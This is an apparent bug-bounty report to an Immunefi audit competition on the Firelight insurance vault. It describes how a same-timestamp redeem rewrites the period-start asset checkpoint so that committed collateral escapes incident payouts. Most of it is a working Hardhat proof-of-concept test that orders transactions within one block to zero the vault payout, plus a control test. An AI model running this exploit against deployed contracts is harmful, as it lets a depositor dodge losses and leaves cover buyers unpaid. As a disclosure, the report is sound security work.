# 88712 sc high mutable period start snapshot lets lps remove collateral after it has been committed to cover

**Submitted on Aug 14th 2026 at 17:02:00 UTC by @Jolyon for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88712
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

Capacity commitment and claim payout do not use an immutable shared collateral snapshot. At period start `T`, the allocator commits cover against `totalAssetsAt(T)`. An LP can then withdraw at the same timestamp and reduce that historical value. Settlement still uses the original commitment, while payout uses the reduced snapshot, allowing collateral backing already-sold cover to escape slashing.

## Vulnerability Details

The allocator reads period-start assets and stores the resulting capacity in [`CoverOrderAllocator.sol`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L696-L724) and [`commitAllocation`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/CoverOrderAllocator.sol#L332-L354).

A later same-timestamp `withdraw/redeem` writes the reduced active-assets value through [`_logTrace`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L717-L775). [`Checkpoints.push`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/lib/Checkpoints.sol#L198-L223) appends or replaces the checkpoint at `T`, and the inclusive lookup makes it authoritative.

Settlement continues using the stored commitment, but [`FirelightVault.payout`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L892-L965) re-reads the now-lower `totalAssetsAt(T)` as its payout cap.

The exploit requires an exact-`T` block, allocator-first ordering, and the attacker’s reduced checkpoint to remain the final relevant write at `T`.

## Impact Details

If the allocator commits against `A` vault assets and the attacker subsequently withdraws `X` at the same timestamp, the vault payout cap can be reduced from `A` to `A-X`.

For a full exit where `X=A`, the vault payout becomes zero. The incident is nevertheless finalized by [`IncidentManager`](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/IncidentManager.sol#L403-L438), while the attacker later claims the un-slashed collateral.

This creates an unfunded liability against already-sold cover and therefore maps to **Protocol insolvency**.

## Proof of Concept

The attached Hardhat test reproduces the issue using the unmodified `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`. Only the ERC20 asset and price feed are mocked; the test is fully local and does not use a fork or contact a live network.

The test performs the following sequence:

{% stepper %}
{% step %}

## Deposit and create cover

An LP deposits `100` asset units into the vault, while the funded and approved first-loss buffer provides another `20` units.

A `120`-unit cover order is created for period `P`.
{% endstep %}

{% step %}

## Commit and redeem at the exact period start

At the exact start `T` of `P`, `commitAllocation` executes first and the LP's full `redeem` executes second in the same block.

The commitment retains `120` capacity, but the redemption changes `totalAssetsAt(T)` to zero while the vault still physically holds the `100` units as a delayed withdrawal.
{% endstep %}

{% step %}

## Settle cover and process the incident

The cover is settled before a valid incident occurs. For the resulting `120`-unit loss, the first-loss buffer pays `20`, while the vault is requested to pay `100` but pays zero.
{% endstep %}

{% step %}

## Claim escaped collateral

The incident closes, and at `P+2` the LP claims the entire `100` units that should have remained slashable.
{% endstep %}
{% endstepper %}

A negative-control test changes only the redemption timestamp from `T` to `T+1`. In that case, the period-start snapshot remains `100`, the vault pays the complete `100`-unit request, and the LP's later withdrawal claim reverts with `NoWithdrawalAmount`.

This demonstrates that mutating the already-consumed period-start checkpoint is the direct cause of the payout shortfall.

`test/poc/F001.exact-period-boundary.js`

```bash
npx hardhat test test/poc/F001.exact-period-boundary.js
```

```js
const { expect } = require("chai");
const { ethers, network, upgrades } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");

const DAY = 24n * 60n * 60n;
const VAULT_ASSETS = ethers.parseUnits("100", 6);
const FLB_ASSETS = ethers.parseUnits("20", 6);
const COVER = ethers.parseUnits("120", 18);
const ONE_USD = 10n ** 18n;

const buildSingleOrderTree = (orderId, marketId, allocatedCover) =>
  StandardMerkleTree.of(
    [[orderId, [[marketId, allocatedCover]]]],
    ["uint256", "(bytes32,uint256)[]"],
  );

async function deploySystem() {
  const signers = await ethers.getSigners();
  const [
    deployer,
    attacker,
    buyer,
    premiumCollector,
    firstLossBuffer,
    curator,
    allocatorRole,
    configAdmin,
    nftAdmin,
    incidentCurator,
    assessmentApprover,
    assessmentRejecter,
    incidentInvalidator,
    payoutReceiver,
  ] = signers;

  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const asset = await MockERC20.deploy("Mock USD", "mUSD", 6);

  const Vault = await ethers.getContractFactory("FirelightVault");
  const encodedVaultInit = ethers.AbiCoder.defaultAbiCoder().encode(
    ["address", "address", "address", "address", "address", "address", "uint256", "uint48"],
    [
      deployer.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.parseUnits("1000000", 6),
      DAY,
    ],
  );
  const vault = await upgrades.deployProxy(Vault, [
    asset.target,
    "Firelight Staked Mock USD",
    "stmUSD",
    encodedVaultInit,
  ]);

  const MockAggregator = await ethers.getContractFactory("MockAggregatorV3");
  const priceFeed = await MockAggregator.deploy(18, ONE_USD);

  const CoverNFT = await ethers.getContractFactory("CoverNFT");
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    ["Firelight Cover", "FLCOVER", "", nftAdmin.address, ethers.ZeroAddress, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: "transparent" },
  );

  const protocol = "Morpho";
  const market = ethers.encodeBytes32String("market-A");
  const marketId = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(["uint64", "string", "bytes32"], [1, protocol, market]),
  );

  const Allocator = await ethers.getContractFactory("CoverOrderAllocator");
  const allocator = await upgrades.deployProxy(
    Allocator,
    [
      {
        vault: vault.target,
        premiumCollector: premiumCollector.address,
        coverNFT: coverNFT.target,
        priceFeedAdapter: priceFeed.target,
        maxPriceAge: 30n * DAY,
        premiumTokens: [asset.target],
        admin: deployer.address,
        adminRole: deployer.address,
        curatorRole: curator.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: configAdmin.address,
        initialProtocolConcentrations: [
          { chainId: 1, protocol, maxProtocolConcentrationBps: 10_000 },
        ],
        newMarkets: [{ chainId: 1, protocol, market }],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: asset.target,
          firstLossBuffer: firstLossBuffer.address,
          effectiveLeverage: 12_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0,
        },
      },
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await coverNFT.connect(nftAdmin).grantRole(await coverNFT.MINTER_ROLE(), allocator.target);

  const IncidentManager = await ethers.getContractFactory("IncidentManager");
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      deployer.address,
      incidentCurator.address,
      assessmentApprover.address,
      assessmentRejecter.address,
      incidentInvalidator.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      payoutReceiver.address,
      allocator.target,
      priceFeed.target,
      30n * DAY,
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await vault.grantRole(await vault.PAYOUT_ROLE(), incidentManager.target);
  await vault.grantRole(await vault.INCIDENT_ROLE(), incidentManager.target);
  await vault.grantRole(await vault.PAYOUT_ALLOWLIST_ROLE(), deployer.address);
  await vault.addToPayoutAllowlist(payoutReceiver.address);

  // Keep the public external-FLB assumption satisfied: the buffer is both funded
  // and approved. It contributes 20 capacity and pays its full first-loss tranche.
  await asset.mint(firstLossBuffer.address, FLB_ASSETS);
  await asset.connect(firstLossBuffer).approve(incidentManager.target, FLB_ASSETS);

  await asset.mint(attacker.address, VAULT_ASSETS);
  await asset.connect(attacker).approve(vault.target, VAULT_ASSETS);
  await vault.connect(attacker).deposit(VAULT_ASSETS, attacker.address);

  await asset.mint(buyer.address, ethers.parseUnits("1", 6));
  await asset.connect(buyer).approve(allocator.target, ethers.MaxUint256);

  const capturePeriod = await vault.currentPeriod() + 1n;
  await allocator.connect(curator).createCoverOrder(
    buyer.address,
    buyer.address,
    "beneficiary:buyer",
    asset.target,
    [{ marketId, coverRateAnnual: 500, coverAmount: COVER }],
    0,
  );

  return {
    asset,
    vault,
    allocator,
    coverNFT,
    incidentManager,
    attacker,
    buyer,
    allocatorRole,
    incidentCurator,
    assessmentApprover,
    payoutReceiver,
    firstLossBuffer,
    marketId,
    capturePeriod,
  };
}

describe("PoC F-001: mutable inclusive period-start checkpoint", function () {
  it("commits 120 cover against 20 FLB + 100 vault assets, appends zero at T, and returns all vault collateral", async function () {
    const ctx = await deploySystem();
    const {
      asset,
      vault,
      allocator,
      coverNFT,
      incidentManager,
      attacker,
      buyer,
      allocatorRole,
      incidentCurator,
      assessmentApprover,
      payoutReceiver,
      firstLossBuffer,
      marketId,
      capturePeriod,
    } = ctx;

    const orderId = 0n;
    const allocation = { marketId, allocatedCover: COVER };
    const tree = buildSingleOrderTree(orderId, marketId, COVER);
    const proof = tree.getProof(0);
    const T = await vault.currentPeriodEnd();

    expect(await vault.totalAssets()).to.equal(VAULT_ASSETS);
    expect(await vault.totalAssetsAt(T - 1n)).to.equal(VAULT_ASSETS);
    expect(await vault.totalAssetsAt(T)).to.equal(VAULT_ASSETS);
    expect(await asset.balanceOf(firstLossBuffer.address)).to.equal(FLB_ASSETS);
    expect(await vault.currentPeriod()).to.equal(capturePeriod - 1n);

    // Mine the honest allocator commitment first and the attacker's redeem second
    // in one exact-boundary block. Both transactions therefore observe timestamp T,
    // while state transitions follow transaction order inside the block.
    let commitTx;
    let redeemTx;
    await network.provider.send("evm_setAutomine", [false]);
    try {
      await network.provider.send("evm_setNextBlockTimestamp", [Number(T)]);
      commitTx = await allocator.connect(allocatorRole).commitAllocation(
        capturePeriod,
        tree.root,
        COVER,
        COVER,
        {
          gasLimit: 8_000_000,
          maxFeePerGas: ethers.parseUnits("10", "gwei"),
          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei"),
        },
      );
      redeemTx = await vault.connect(attacker).redeem(VAULT_ASSETS, attacker.address, attacker.address, {
        gasLimit: 8_000_000,
        maxFeePerGas: ethers.parseUnits("10", "gwei"),
        maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
      });
      await network.provider.send("evm_mine");
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }

    const commitReceipt = await commitTx.wait();
    const redeemReceipt = await redeemTx.wait();
    const boundaryBlock = await ethers.provider.getBlock(commitReceipt.blockNumber);

    expect(commitReceipt.blockNumber).to.equal(redeemReceipt.blockNumber);
    expect(commitReceipt.index).to.be.lessThan(redeemReceipt.index);
    expect(boundaryBlock.timestamp).to.equal(Number(T));
    expect(boundaryBlock.transactions.length).to.equal(2);
    expect(redeemReceipt.index).to.equal(boundaryBlock.transactions.length - 1);

    const commitment = await allocator.getAllocationCommitment(capturePeriod);
    expect(commitment.totalAvailableCapacity).to.equal(COVER);
    expect(commitment.totalDeclaredAllocated).to.equal(COVER);

    // The vault still physically holds all 100 tokens, but the active exposure
    // checkpoint at the already-consumed period start is now zero.
    expect(await vault.totalAssets()).to.equal(0n);
    expect(await vault.totalAssetsAt(T - 1n)).to.equal(VAULT_ASSETS);
    expect(await vault.totalAssetsAt(T)).to.equal(0n);
    expect(await vault.pendingWithdrawAssets()).to.equal(VAULT_ASSETS);
    expect(await vault.withdrawAssets(capturePeriod + 1n)).to.equal(VAULT_ASSETS);
    expect(await asset.balanceOf(vault.target)).to.equal(VAULT_ASSETS);

    // Settlement trusts the stored high commitment and does not re-read backing.
    const settlement = await allocator.connect(allocatorRole).settleCoverOrder(orderId, [allocation], proof);
    const settlementReceipt = await settlement.wait();
    const settlementBlock = await ethers.provider.getBlock(settlementReceipt.blockNumber);
    expect(await coverNFT.ownerOf(orderId)).to.equal(buyer.address);
    expect((await allocator.getAllocationCommitment(capturePeriod)).totalSettledCover).to.equal(COVER);

    // Capture the incident strictly after the cover has settled. This keeps the PoC
    // independent from any post-loss/hindsight-cover interpretation: the cover is
    // already active before the loss, while its capture period still starts at T.
    const incidentCapture = BigInt(settlementBlock.timestamp) + 1n;
    await time.setNextBlockTimestamp(incidentCapture);

    // Process a real IncidentManager assessment against the settled allocation.
    // The funded and approved FLB pays 20 first. The remaining 100-unit loss
    // is then requested from the vault, isolating the checkpoint defect.
    await incidentManager
      .connect(incidentCurator)
      .createIncident(incidentCapture, "F-001 boundary incident", ethers.id("F-001-boundary-incident"));
    await incidentManager.connect(incidentCurator).confirmIncident(1n, "ipfs://f001");
    await incidentManager.connect(incidentCurator).addAssessmentLosses(1n, [
      { coverTokenId: orderId, marketId, amount: COVER },
    ]);
    await incidentManager.connect(incidentCurator).submitCurrentAssessment(1n);

    // No intervening settlement/incident write restores the corrupted T snapshot.
    expect(await vault.totalAssetsAt(T)).to.equal(0n);
    expect(await vault.totalAssets()).to.equal(0n);
    expect(await vault.withdrawAssets(capturePeriod + 1n)).to.equal(VAULT_ASSETS);
    expect(await vault.pendingWithdrawAssets()).to.equal(VAULT_ASSETS);
    expect(await asset.balanceOf(vault.target)).to.equal(VAULT_ASSETS);

    const approval = incidentManager.connect(assessmentApprover).approveCurrentAssessment(1n);
    await expect(approval)
      .to.emit(vault, "PayoutExecuted")
      .withArgs(payoutReceiver.address, VAULT_ASSETS, 0n, incidentCapture);
    await expect(approval)
      .to.emit(incidentManager, "IncidentPayoutExecuted")
      .withArgs(
        1n,
        1n,
        capturePeriod,
        capturePeriod,
        payoutReceiver.address,
        firstLossBuffer.address,
        asset.target,
        FLB_ASSETS,
        COVER,
        VAULT_ASSETS,
        0n,
      );
    await expect(approval).to.emit(incidentManager, "IncidentClosed").withArgs(1n, 0n, COVER);

    const [incident] = await incidentManager.getIncident(1n);
    expect(incident.status).to.equal(4n); // CLOSED
    expect(incident.vaultPaidAmount).to.equal(0n);
    expect(await asset.balanceOf(payoutReceiver.address)).to.equal(FLB_ASSETS);
    expect(await asset.balanceOf(firstLossBuffer.address)).to.equal(0n);
    expect(await asset.balanceOf(vault.target)).to.equal(VAULT_ASSETS);

    // At P+2, the attacker claims the entire collateral that escaped the P loss.
    await time.increaseTo(T + 2n * DAY);
    expect(await vault.currentPeriod()).to.equal(capturePeriod + 2n);
    await expect(vault.connect(attacker).claimWithdraw(capturePeriod + 1n))
      .to.emit(vault, "CompleteWithdraw")
      .withArgs(attacker.address, VAULT_ASSETS, capturePeriod + 1n);

    expect(await asset.balanceOf(attacker.address)).to.equal(VAULT_ASSETS);
    expect(await asset.balanceOf(vault.target)).to.equal(0n);
    expect(await vault.pendingWithdrawAssets()).to.equal(0n);
  });

  it("control: a redeem at T+1 cannot rewrite the period-start cap and the 100-unit payout consumes the withdrawal", async function () {
    const ctx = await deploySystem();
    const {
      asset,
      vault,
      allocator,
      incidentManager,
      attacker,
      allocatorRole,
      incidentCurator,
      assessmentApprover,
      payoutReceiver,
      marketId,
      capturePeriod,
    } = ctx;

    const orderId = 0n;
    const allocation = { marketId, allocatedCover: COVER };
    const tree = buildSingleOrderTree(orderId, marketId, COVER);
    const proof = tree.getProof(0);
    const T = await vault.currentPeriodEnd();

    await time.setNextBlockTimestamp(T);
    await allocator.connect(allocatorRole).commitAllocation(capturePeriod, tree.root, COVER, COVER);

    // The only changed fact is timing: the exit occurs one second after the
    // boundary instead of at the already-consumed period-start key.
    await time.setNextBlockTimestamp(T + 1n);
    await vault.connect(attacker).redeem(VAULT_ASSETS, attacker.address, attacker.address);

    expect(await vault.totalAssetsAt(T)).to.equal(VAULT_ASSETS);
    expect(await vault.totalAssetsAt(T + 1n)).to.equal(0n);
    expect(await vault.pendingWithdrawAssets()).to.equal(VAULT_ASSETS);

    const settlement = await allocator.connect(allocatorRole).settleCoverOrder(orderId, [allocation], proof);
    const settlementReceipt = await settlement.wait();
    const settlementBlock = await ethers.provider.getBlock(settlementReceipt.blockNumber);
    const incidentCapture = BigInt(settlementBlock.timestamp) + 1n;
    await time.setNextBlockTimestamp(incidentCapture);

    await incidentManager
      .connect(incidentCurator)
      .createIncident(incidentCapture, "F-001 control incident", ethers.id("F-001-control-incident"));
    await incidentManager.connect(incidentCurator).confirmIncident(1n, "ipfs://f001-control");
    await incidentManager.connect(incidentCurator).addAssessmentLosses(1n, [
      { coverTokenId: orderId, marketId, amount: COVER },
    ]);
    await incidentManager.connect(incidentCurator).submitCurrentAssessment(1n);

    const approval = incidentManager.connect(assessmentApprover).approveCurrentAssessment(1n);
    await expect(approval)
      .to.emit(vault, "PayoutExecuted")
      .withArgs(payoutReceiver.address, VAULT_ASSETS, VAULT_ASSETS, incidentCapture);
    await expect(approval).to.emit(incidentManager, "IncidentClosed").withArgs(1n, VAULT_ASSETS, COVER);

    expect(await asset.balanceOf(payoutReceiver.address)).to.equal(FLB_ASSETS + VAULT_ASSETS);
    expect(await asset.balanceOf(vault.target)).to.equal(0n);
    expect(await vault.pendingWithdrawAssets()).to.equal(0n);

    await time.increaseTo(T + 2n * DAY);
    await expect(vault.connect(attacker).claimWithdraw(capturePeriod + 1n))
      .to.be.revertedWithCustomError(vault, "NoWithdrawalAmount")
      .withArgs(capturePeriod + 1n);
  });
});
```
